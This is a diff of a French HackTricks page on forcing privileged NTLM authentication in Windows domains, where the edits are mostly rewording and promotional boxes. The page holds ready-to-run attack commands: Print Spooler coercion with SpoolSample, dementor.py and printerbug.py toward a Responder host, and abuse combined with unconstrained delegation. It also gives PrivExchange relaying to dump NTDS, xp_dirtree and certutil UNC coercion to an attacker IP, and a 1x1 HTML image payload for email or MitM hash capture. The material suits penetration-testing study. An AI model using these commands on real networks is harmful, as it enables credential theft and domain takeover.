@@ -1,35 +1,38 @@
 # Forcer l'authentification privilégiée NTLM
 
+{% hint style="success" %}
+Apprenez et pratiquez le hacking AWS :<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Apprenez et pratiquez le hacking GCP : <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+
 <details>
 
-<summary><strong>Apprenez le piratage AWS de zéro à héros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary>Soutenir HackTricks</summary>
 
-* Travaillez-vous dans une **entreprise de cybersécurité**? Vous voulez voir votre **entreprise annoncée dans HackTricks**? ou voulez-vous avoir accès à la **dernière version du PEASS ou télécharger HackTricks en PDF**? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
-* Découvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
-* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
-* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Partagez vos astuces de piratage en soumettant des PR au [dépôt hacktricks](https://github.com/carlospolop/hacktricks) et [dépôt hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.
+* Consultez les [**plans d'abonnement**](https://github.com/sponsors/carlospolop) !
+* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez-nous sur** **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Partagez des astuces de hacking en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) dépôts GitHub.
 
 </details>
+{% endhint %}
 
 ## SharpSystemTriggers
 
-[**SharpSystemTriggers**](https://github.com/cube0x0/SharpSystemTriggers) est une **collection** de **déclencheurs d'authentification à distance** codés en C# en utilisant le compilateur MIDL pour éviter les dépendances tierces.
+[**SharpSystemTriggers**](https://github.com/cube0x0/SharpSystemTriggers) est une **collection** de **déclencheurs d'authentification à distance** codés en C# utilisant le compilateur MIDL pour éviter les dépendances tierces.
 
-## Abus du service Spouleur
+## Abus du service Spooler
 
-Si le service _**Spouleur d'impression**_ est **activé**, vous pouvez utiliser des informations d'identification AD déjà connues pour **demander** au serveur d'impression du contrôleur de domaine une **mise à jour** sur les nouveaux travaux d'impression et lui dire simplement de **envoyer la notification à un système**.\
-Notez que lorsque l'imprimante envoie la notification à des systèmes arbitraires, elle doit s'**authentifier contre** ce **système**. Par conséquent, un attaquant peut faire en sorte que le service _**Spouleur d'impression**_ s'authentifie contre un système arbitraire, et le service **utilisera le compte de l'ordinateur** dans cette authentification.
+Si le service _**Print Spooler**_ est **activé**, vous pouvez utiliser des identifiants AD déjà connus pour **demander** au serveur d'impression du contrôleur de domaine une **mise à jour** sur les nouvelles tâches d'impression et simplement lui dire de **envoyer la notification à un système**.\
+Notez que lorsque l'imprimante envoie la notification à des systèmes arbitraires, elle doit **s'authentifier contre** ce **système**. Par conséquent, un attaquant peut faire en sorte que le service _**Print Spooler**_ s'authentifie contre un système arbitraire, et le service **utilisera le compte d'ordinateur** dans cette authentification.
 
-### Recherche de serveurs Windows sur le domaine
+### Trouver des serveurs Windows sur le domaine
 
-En utilisant PowerShell, obtenez une liste de machines Windows. Les serveurs sont généralement prioritaires, alors concentrons-nous là-dessus:
+En utilisant PowerShell, obtenez une liste de machines Windows. Les serveurs sont généralement prioritaires, concentrons-nous donc là-dessus :
 ```bash
 Get-ADComputer -Filter {(OperatingSystem -like "*windows*server*") -and (OperatingSystem -notlike "2016") -and (Enabled -eq "True")} -Properties * | select Name | ft -HideTableHeaders > servers.txt
 ```
-### Recherche des services Spooler en écoute
+### Finding Spooler services listening
 
-En utilisant une version légèrement modifiée de @mysmartlogin (Vincent Le Toux) [SpoolerScanner](https://github.com/NotMedic/NetNTLMtoSilverTicket), vérifiez si le service Spooler est en écoute :
+En utilisant un @mysmartlogin légèrement modifié (Vincent Le Toux) [SpoolerScanner](https://github.com/NotMedic/NetNTLMtoSilverTicket), vérifiez si le service Spooler écoute :
 ```bash
 . .\Get-SpoolStatus.ps1
 ForEach ($server in Get-Content servers.txt) {Get-SpoolStatus $server}
@@ -40,7 +43,7 @@ rpcdump.py DOMAIN/USER:PASSWORD@SERVER.DOMAIN.COM | grep MS-RPRN
 ```
 ### Demander au service de s'authentifier contre un hôte arbitraire
 
-Vous pouvez compiler [**SpoolSample à partir d'ici**](https://github.com/NotMedic/NetNTLMtoSilverTicket)**.**
+Vous pouvez compiler[ **SpoolSample depuis ici**](https://github.com/NotMedic/NetNTLMtoSilverTicket)**.**
 ```bash
 SpoolSample.exe <TARGET> <RESPONDERIP>
 ```
@@ -49,19 +52,19 @@ ou utilisez [**dementor.py de 3xocyte**](https://github.com/NotMedic/NetNTLMtoSi
 python dementor.py -d domain -u username -p password <RESPONDERIP> <TARGET>
 printerbug.py 'domain/username:password'@<Printer IP> <RESPONDERIP>
 ```
-### Combinaison avec la Délégation sans contrainte
+### Combinaison avec la Délégation Non Contraignante
 
-Si un attaquant a déjà compromis un ordinateur avec la [Délégation sans contrainte](unconstrained-delegation.md), l'attaquant pourrait **faire authentifier l'imprimante contre cet ordinateur**. En raison de la délégation sans contrainte, le **TGT** du **compte d'ordinateur de l'imprimante** sera **enregistré dans** la **mémoire** de l'ordinateur avec délégation sans contrainte. Comme l'attaquant a déjà compromis cet hôte, il pourra **récupérer ce ticket** et l'exploiter ([Pass the Ticket](pass-the-ticket.md)).
+Si un attaquant a déjà compromis un ordinateur avec [Délégation Non Contraignante](unconstrained-delegation.md), l'attaquant pourrait **faire authentifier l'imprimante contre cet ordinateur**. En raison de la délégation non contraignante, le **TGT** du **compte d'ordinateur de l'imprimante** sera **enregistré dans** la **mémoire** de l'ordinateur avec délégation non contraignante. Comme l'attaquant a déjà compromis cet hôte, il pourra **récupérer ce ticket** et en abuser ([Pass the Ticket](pass-the-ticket.md)).
 
-## Authentification forcée RCP
+## Authentification RCP Forcée
 
 {% embed url="https://github.com/p0dalirius/Coercer" %}
 
 ## PrivExchange
 
-L'attaque `PrivExchange` est le résultat d'une faille trouvée dans la fonctionnalité **PushSubscription du serveur Exchange**. Cette fonctionnalité permet au serveur Exchange d'être forcé par n'importe quel utilisateur de domaine avec une boîte aux lettres de s'authentifier sur n'importe quel hôte fourni par le client via HTTP.
+L'attaque `PrivExchange` est le résultat d'un défaut trouvé dans la **fonctionnalité `PushSubscription` du Serveur Exchange**. Cette fonctionnalité permet au serveur Exchange d'être forcé par tout utilisateur de domaine ayant une boîte aux lettres à s'authentifier auprès de tout hôte fourni par le client via HTTP.
 
-Par défaut, le **service Exchange s'exécute en tant que SYSTEM** et se voit accorder des privilèges excessifs (en particulier, il a **des privilèges WriteDacl sur la pré-mise à jour cumulative 2019 du domaine**). Cette faille peut être exploitée pour permettre le **relais d'informations vers LDAP et extraire ensuite la base de données NTDS du domaine**. Dans les cas où le relais vers LDAP n'est pas possible, cette faille peut toujours être utilisée pour relayer et s'authentifier sur d'autres hôtes dans le domaine. L'exploitation réussie de cette attaque accorde un accès immédiat à l'administrateur de domaine avec n'importe quel compte utilisateur de domaine authentifié.
+Par défaut, le **service Exchange s'exécute en tant que SYSTEM** et se voit accorder des privilèges excessifs (en particulier, il a des **privilèges WriteDacl sur le domaine avant la mise à jour cumulative de 2019**). Ce défaut peut être exploité pour permettre le **transfert d'informations vers LDAP et ensuite extraire la base de données NTDS du domaine**. Dans les cas où le transfert vers LDAP n'est pas possible, ce défaut peut encore être utilisé pour transférer et s'authentifier auprès d'autres hôtes au sein du domaine. L'exploitation réussie de cette attaque accorde un accès immédiat à l'Administrateur de Domaine avec n'importe quel compte utilisateur de domaine authentifié.
 
 ## À l'intérieur de Windows
 
@@ -75,23 +78,23 @@ C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2010.7-0\MpCmdRun.exe -S
 ```sql
 EXEC xp_dirtree '\\10.10.17.231\pwn', 1, 1
 ```
-Ou utilisez cette autre technique: [https://github.com/p0dalirius/MSSQL-Analysis-Coerce](https://github.com/p0dalirius/MSSQL-Analysis-Coerce)
+Ou utilisez cette autre technique : [https://github.com/p0dalirius/MSSQL-Analysis-Coerce](https://github.com/p0dalirius/MSSQL-Analysis-Coerce)
 
 ### Certutil
 
-Il est possible d'utiliser le lolbin certutil.exe (binaire signé par Microsoft) pour forcer l'authentification NTLM:
+Il est possible d'utiliser certutil.exe lolbin (binaire signé par Microsoft) pour forcer l'authentification NTLM :
 ```bash
 certutil.exe -syncwithWU  \\127.0.0.1\share
 ```
-## Injection HTML
+## HTML injection
 
 ### Via email
 
-Si vous connaissez l'**adresse e-mail** de l'utilisateur qui se connecte à une machine que vous souhaitez compromettre, vous pourriez simplement lui envoyer un **e-mail avec une image de 1x1 pixel** comme suit:
+Si vous connaissez l'**adresse email** de l'utilisateur qui se connecte à une machine que vous souhaitez compromettre, vous pourriez simplement lui envoyer un **email avec une image 1x1** telle que
 ```html
 <img src="\\10.10.17.231\test.ico" height="1" width="1" />
 ```
-et lorsqu'il l'ouvre, il essaiera de s'authentifier.
+et quand il l'ouvre, il essaiera de s'authentifier.
 
 ### MitM
 
@@ -99,7 +102,22 @@ Si vous pouvez effectuer une attaque MitM sur un ordinateur et injecter du HTML 
 ```html
 <img src="\\10.10.17.231\test.ico" height="1" width="1" />
 ```
-## Casser NTLMv1
+## Cracking NTLMv1
 
-Si vous pouvez capturer [les défis NTLMv1 lisez ici comment les casser](../ntlm/#ntlmv1-attack).\
-_Rappelez-vous que pour casser NTLMv1, vous devez définir le défi Responder sur "1122334455667788"_
+Si vous pouvez capturer [les défis NTLMv1 lisez ici comment les cracker](../ntlm/#ntlmv1-attack).\
+_Rappelez-vous que pour cracker NTLMv1, vous devez définir le défi Responder sur "1122334455667788"_
+
+{% hint style="success" %}
+Apprenez et pratiquez le hacking AWS :<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Apprenez et pratiquez le hacking GCP : <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+
+<details>
+
+<summary>Soutenir HackTricks</summary>
+
+* Consultez les [**plans d'abonnement**](https://github.com/sponsors/carlospolop) !
+* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez-nous sur** **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Partagez des astuces de hacking en soumettant des PRs aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) dépôts github.
+
+</details>
+{% endhint %}
